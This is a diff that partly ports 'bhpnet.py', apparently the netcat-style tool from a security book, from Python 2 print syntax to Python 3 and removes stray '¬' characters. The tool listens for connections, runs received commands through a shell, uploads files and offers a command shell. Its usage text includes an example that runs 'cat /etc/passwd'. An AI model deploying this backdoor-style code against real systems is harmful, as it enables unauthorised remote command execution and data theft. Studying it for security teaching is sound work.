@@ -29,14 +29,14 @@ def client_sender(buffer):
 				response+= data
 				if recv_len < 4096:
 					break
-			print response,
+			print(response)
 			# wait for more input
 			buffer = raw_input("")
 			buffer += "\n"
 			# send it off
 			client.send(buffer)	
 	except:
-		print "[*] Exception! Exiting."
+		print ("[*] Exception! Exiting.")
 		# tear down the connection
 		client.close()
 def server_loop():
@@ -50,14 +50,14 @@ def server_loop():
 	while True:
 		client_socket, addr = server.accept()
 		# spin off a thread to handle our new client
-		client_thread = threading.Thread(target=client_handler,¬args=(client_socket,))
+		client_thread = threading.Thread(target=client_handler,args=(client_socket,))
 		client_thread.start()
 def run_command(command):
 	# trim the newline
 	command = command.rstrip()
 	# run the command and get the output back
 	try:
-		output = subprocess.check_output(command,stderr=subprocess. ¬
+		output = subprocess.check_output(command,stderr=subprocess.
 		STDOUT, shell=True)
 	except:
 		output = "Failed to execute command.\r\n"
@@ -86,7 +86,7 @@ def client_handler(client_socket):
 			# acknowledge that we wrote the file out
 			client_socket.send("Successfully saved file to ¬%s\r\n" % upload_destination)		
 		except:
-			client_socket.send("Failed to save file to %s\r\n" % ¬upload_destination)	
+			client_socket.send("Failed to save file to %s\r\n" % upload_destination)
 	# check for command execution
 	if len(execute):
 		# run the command
@@ -106,20 +106,20 @@ def client_handler(client_socket):
 			# send back the response
 			client_socket.send(response)	
 def usage():
-	print "BHP Net Tool"
+	print ("BHP Net Tool")
 	print
-	print "Usage: bhpnet.py -t target_host -p port"
-	print "-l --listen- listen on [host]:[port] for ¬incoming connections"
-	print "-e --execute=file_to_run - execute the given file upon ¬receiving a connection"
-	print "-c --command- initialize a command shell"
-	print "-u --upload=destination - upon receiving connection upload a ¬file and write to [destination]"
+	print ("Usage: bhpnet.py -t target_host -p port")
+	print ("-l --listen- listen on [host]:[port] for ¬incoming connections")
+	print ("-e --execute=file_to_run - execute the given file upon ¬receiving a connection")
+	print ("-c --command- initialize a command shell")
+	print ("-u --upload=destination - upon receiving connection upload a ¬file and write to [destination]")
 	print
 	print
-	print "Examples: "
-	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
-	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
-	print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
-	print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
+	print ("Examples: ")
+	print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
+	print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
+	print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
+	print ("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
 	sys.exit(0)
 def main():
 	global listen
@@ -132,10 +132,10 @@ def main():
 		usage()		
 	# read the commandline options
 	try:
-		opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:", ¬
+		opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
 		["help","listen","execute","target","port","command","upload"])
 	except getopt.GetoptError as err:
-		print str(err)
+		print (str(err))
 		usage()
 	for o,a in opts:
 		if o in ("-h","--help"):
@@ -167,4 +167,4 @@ def main():
 			# depending on our command line options above
 	if listen:
 		server_loop()
-main()			
+main()
